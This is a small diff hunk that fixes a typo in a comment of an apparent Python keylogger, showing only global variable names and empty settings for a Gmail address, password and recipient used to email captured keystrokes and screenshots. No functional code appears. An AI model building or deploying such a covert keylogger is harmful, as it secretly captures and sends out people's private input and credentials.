@@ -11,7 +11,7 @@ global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval
 
 t="";pics_names=[]
 
-#Remember to edit this so that you dont send keyloh=gger to person
+#Remember to edit this so that you dont send keylogger to person
 #settings
 
 yourgmail = ""                #gmail?
